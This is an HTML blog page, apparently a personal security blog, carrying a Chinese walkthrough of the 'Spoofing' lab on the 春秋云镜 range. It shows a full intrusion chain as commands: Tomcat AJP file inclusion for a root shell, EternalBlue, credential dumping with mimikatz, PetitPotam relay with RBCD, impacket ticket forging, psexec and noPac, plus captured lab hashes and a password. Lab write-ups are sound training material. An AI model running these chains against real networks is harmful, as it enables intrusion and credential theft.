@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/null">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="D0G">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Spoofingflag1信息收集 8080是一个后台系统    tomcat 9.0.23 有CVE-2020-1983 Tomcat文件包含漏洞 外网打点查看一下web.xml 1python ajpShooter.py http:&#x2F;&#x2F;39.98.109.11:8080 8009  &#x2F;WEB-INF&#x2F;web.xml read     存在UploadServlet功能 打文件包含rce  文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Spoofing">
+<meta property="og:url" content="https://blog.cgjue.cn/2025/03/18/Spoofing/index.html">
+<meta property="og:site_name" content="云自无心水自闲">
+<meta property="og:description" content="Spoofingflag1信息收集 8080是一个后台系统    tomcat 9.0.23 有CVE-2020-1983 Tomcat文件包含漏洞 外网打点查看一下web.xml 1python ajpShooter.py http:&#x2F;&#x2F;39.98.109.11:8080 8009  &#x2F;WEB-INF&#x2F;web.xml read     存在UploadServlet功能 打文件包含rce  文件">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.cgjue.cn/img/ctfer4.png#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
+<meta property="article:published_time" content="2025-03-18T03:10:20.000Z">
+<meta property="article:modified_time" content="2025-03-18T07:50:34.203Z">
+<meta property="article:author" content="D0G">
+<meta property="article:tag" content="Tomcat NTLM WebClient Coerce Authentication noPac">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.cgjue.cn/img/ctfer4.png#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>春秋云镜-Spoofing - 云自无心水自闲</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.cgjue.cn","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":66,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":100},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="云自无心水自闲" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👻云自无心水自闲</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>朋友们</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png#%E6%96%87%E7%AB%A0%E9%A1%B6%E9%83%A8') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜-Spoofing"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-18 11:10" pubdate>
+          2025年3月18日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜-Spoofing</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Spoofing"><a href="#Spoofing" class="headerlink" title="Spoofing"></a>Spoofing</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/img/image-20250318111350056.png" srcset="/img/loading.gif" lazyload></p>
+<p>8080是一个后台系统</p>
+<p><img src="/img/image-20250318111455368.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/image-20250318113538421.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/image-20250318113547924.png" srcset="/img/loading.gif" lazyload></p>
+<p>tomcat 9.0.23</p>
+<p>有CVE-2020-1983 Tomcat文件包含漏洞</p>
+<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>查看一下web.xml</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ajpShooter.py http://39.98.109.11:8080 8009  /WEB-INF/web.xml <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250318114015713.png" srcset="/img/loading.gif" lazyload></p>
+<p>存在UploadServlet功能</p>
+<p>打文件包含rce</p>
+<p><img src="/img/image-20250318114439017.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件上传目录</p>
+<blockquote>
+<p>Files are stored in .&#x2F;upload&#x2F;60c4510cf9e3c5d2e75d932aca531a1c&#x2F;20250318114427444.txt</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ajpShooter.py http://39.98.109.11:8080/ 8009 /upload/afd3fcf0deba60870403fa7085086524/20250318010820634.txt <span class="hljs-built_in">eval</span><br></code></pre></td></tr></table></figure>
+
+<p>反弹的shell直接是root权限，在root下直接读取flag01</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>fscan frp 准备好，先进行内网信息收集</p>
+<p><img src="/img/image-20250318115126192.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>172.22.11.6 DC</p>
+<p>172.22.11.26  XR-LCM3AE8B</p>
+<p>172.22.11.45 MSF17-010</p>
+<p>172.22.11.76 入口机</p>
+</blockquote>
+<p>先打45的MSF</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.11.45<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20250318120227523.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="flag03-flag04"><a href="#flag03-flag04" class="headerlink" title="flag03&amp;flag04"></a>flag03&amp;flag04</h2><p>拿一下hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250318120319339.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>XR-DESKTOP$  XIAORANG  afbf69984b774270f847154ee837266d  fe2a64a9a4b33e32c39269dfbba9deb888200849<br>yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</p>
+<p>yangmei      XIAORANG  xrihGHgoNZQ</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250318132302341.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
+</blockquote>
+<p>用bloodhound收集一下信息</p>
+<p>这里用的<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">bloodhound.py</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains python bloodhound.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab --dns-tcp -ns 172.22.11.6 -c all --zip<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">neo4j start <br></code></pre></td></tr></table></figure>
+
+<p>打petitpotam</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains crackmapexec smb 172.22.11.26 -u yangmei -p xrihGHgoNZQ -M petitpotam<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20250318134105818.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">SMB</span>         <span class="hljs-number">172.22</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.26</span>    <span class="hljs-number">445</span>    <span class="hljs-selector-tag">XR-LCM3AE8B</span>      <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-number">10</span> / <span class="hljs-selector-tag">Server</span> <span class="hljs-number">2019</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-number">18362</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:XR-LCM3AE8B) (<span class="hljs-attribute">domain</span>:xiaorang.lab) (<span class="hljs-attribute">signing</span>:False) (<span class="hljs-attribute">SMBv1</span>:False)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD) 如果WebClient在目标机器上开启，那么攻击者可以使用强制技术（例如PetitPotam、PrinterBug）来滥用 WebClient 服务，从而强制进行身份验证，后续通过设置基于资源的约束委派等方式来获取目标机器的最高权限。</p>
+</blockquote>
+<p>探查一下开启webclinet服务的机器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains webclientservicescanner xiaorang.lab/yangmei:xrihGHgoNZQ@172.22.11.6 -no-validation<br>proxychains webclientservicescanner xiaorang.lab/yangmei:xrihGHgoNZQ@172.22.11.26 -no-validation<br></code></pre></td></tr></table></figure>
+
+<p>？？</p>
+<p>打webcline前先配置一下流量转发</p>
+<p>配个公钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#自己的机器上</span><br>ssh-keygen -t rsa -b 4096<br><span class="hljs-built_in">cat</span> Spoofing.pub<br><span class="hljs-comment">#弹的shell</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC42ck2rjvS7xFDA2s4yXz2riryvn1JCXAzd7S/ZEuKDJ4kA/i6a7kiePYzOx+d7hadLfnng1UFbXmXTr59g6h/PIzGvjz6okH0ddRchdY4BOmpZDwrPBZgI0yVi+6/f8rEpEBXCPdL2190yMnZvDnrnwNVDxTS1I/Phd4bwxQ+s/mrk3lX3IjqlO5tbnrsH0agaSOuBYYLB01lhTL+s588a/oHAKWOlAx3EJuhMDOIreWvhNWz6Gr+mu8KTkMSlTOT8l6UKgqYvn1/IhgW20viAzMM1nZQIx5Q2laTqd1xn0eZks7vCkyAGY3XDBzQK5wMadqc4w/DRs2Gy2b/9qfjOqWpWLqJK1sGuCS8gGvmE669405Xm3uOVnFh9upTUZ82La088tKYzjWlvkNbSlCPTZnaW0jscrmFj0x8HVeTvpzGY6WxgzamFJD3TMkRsEutKNRVTNFUmit9FwajsU7Gzyup7BEg/e+LRoCIohDD910F561CXljX0GgsxOFyIFfRVdQda5Qpzw1HyPyOyHoqZSFRE5NFGvlRnr5VkODDSlgJhu11w0IsH9+MXOgLwhlreSEePB09M71yo0fagli32XQGIbrnBo0/aoRA2Qdpg7n3xvc2Y1+BYuccbPSQgIzgU3GJM5xcB8tF8RADAaVdN75RZVNRmAtZolK4JE1alw== dog@kali&quot;</span> &gt; /root/.ssh/authorized_keys<br><span class="hljs-built_in">chmod</span> 600 /root/.ssh/authorized_keys<br><span class="hljs-comment">#自己的机器上</span><br>ssh -i dog-k root@39.98.109.11<br></code></pre></td></tr></table></figure>
+
+
+
+<p>接下来把机器的80端口流量转发到我们本地</p>
+<blockquote>
+<p>但这里有个条件，需要我们把服务器端口的流量转发到客户端本地的80，但SSH的反向端口转发监听的时候只会监听127.0.0.1，这里我们让流量 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的80 ,变相使80监听在0.0.0.0</p>
+</blockquote>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -i ~/.ssh/id_rsa root@<span class="hljs-number">39.98.115.201</span>  -D SOCKS代理IP:PORT -R \*:<span class="hljs-number">79</span>:<span class="hljs-number">127.0.0.1:80</span><br><span class="hljs-attribute">nohup</span> socat TCP-LISTEN:<span class="hljs-number">80</span>,fork,bind=<span class="hljs-number">0.0.0.0</span> TCP:localhost:<span class="hljs-number">79</span> &amp;<br></code></pre></td></tr></table></figure>
+
+<p>测试如下成功</p>
+<p><img src="/img/image-20250318143121347.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>没有ldaps，所以不能使用addcomputer<br>同时在使用proxychains后，ldap:&#x2F;&#x2F;后面只能接dc的ip<br>利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD</p>
+</blockquote>
+<p>本地开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains <span class="hljs-keyword">python3</span> ntlmrelayx.<span class="hljs-keyword">py</span> -t ldap://<span class="hljs-number">172.22</span>.<span class="hljs-number">11.6</span> --<span class="hljs-keyword">no</span>-dump --<span class="hljs-keyword">no</span>-da --<span class="hljs-keyword">no</span>-acl --escalate-user <span class="hljs-string">&#x27;xr-desktop$&#x27;</span> --delegate-access<br>proxychains <span class="hljs-keyword">python3</span> PetitPotam.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> yangmei -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;xrihGHgoNZQ&#x27;</span> -d xiaorang.lab ubuntu@<span class="hljs-number">80</span>/pwn.txt <span class="hljs-number">172.22</span>.<span class="hljs-number">11.26</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20250318144701647.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到ntlmrelayx也提示设置了XR-DESKTOP到172.22.11.26的基于资源的约束委派。</p>
+<p>接下来就是通过基于资源的约束委派获取ST票据，然后注入内存、psexec来获取交互式shell。<br>申请XR-LCM3AE8B CIFS票据。这里的hash是前面抓到的XR-DESKTOP用户的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :5bed3fa07320fd02d0ea1f736f0fd641  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :6f558f06e563b300dc9f5884aca659f3  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6<br><span class="hljs-built_in">export</span> KRB5CCNAME=administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache<br>sudo vim /etc/hosts<span class="hljs-comment">#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里即172.22.11.26</span><br></code></pre></td></tr></table></figure>
+
+<p>之后利用psexec无密码连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk<br></code></pre></td></tr></table></figure>
+
+<p>添加一个管理账户rdp一下拿到flag3</p>
+<blockquote>
+<p>PS：这里会提示其他用户已经登陆，是因为上面psexec连接的xiaorang，关闭其连接即可</p>
+</blockquote>
+<p>如果rdp连接不上，也可以smb 来上传猕猴桃，从psexec执行命令</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains <span class="hljs-keyword">python3</span> smbclient.<span class="hljs-keyword">py</span> xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass -target-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">11.26</span><br>use C$<br><span class="hljs-keyword">cd</span> \windows\temp<br><span class="hljs-keyword">put</span> /root/Desktop/mimikatz.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250318150334933.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传猕猴桃拿一下hash</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250318151143945.png" srcset="/img/loading.gif" lazyload></p>
+<p>zhanghui</p>
+<blockquote>
+<p>zhanghui</p>
+<p>1232126b24cdf8c9bd2f788a9d7c7ed1</p>
+</blockquote>
+<p>打<a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">nopac</a></p>
+<p>XR-DESKTOP$ 或者zhanghui都可以</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains <span class="hljs-keyword">python3</span> noPac.<span class="hljs-keyword">py</span> xiaorang.lab/<span class="hljs-string">&#x27;XR-DESKTOP$&#x27;</span> -hashes <span class="hljs-string">&#x27;:03e8d17f4da1797f6b69a9a7a23244c1&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">11.6</span> --impersonate Administrator -<span class="hljs-keyword">no</span>-<span class="hljs-built_in">add</span> -target-name <span class="hljs-string">&#x27;XR-DESKTOP$&#x27;</span> -old-hash <span class="hljs-string">&#x27;:6f558f06e563b300dc9f5884aca659f3&#x27;</span> -use-ldap -<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes <span class="hljs-string">&#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27;</span> -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250318154133158.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="category-chain-item">春秋云镜</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Tomcat-NTLM-WebClient-Coerce-Authentication-noPac/" class="print-no-link">#Tomcat NTLM WebClient Coerce Authentication noPac</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/17/Exchange/" title="春秋云镜-Exchange">
+                        <span class="hidden-mobile">春秋云镜-Exchange</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
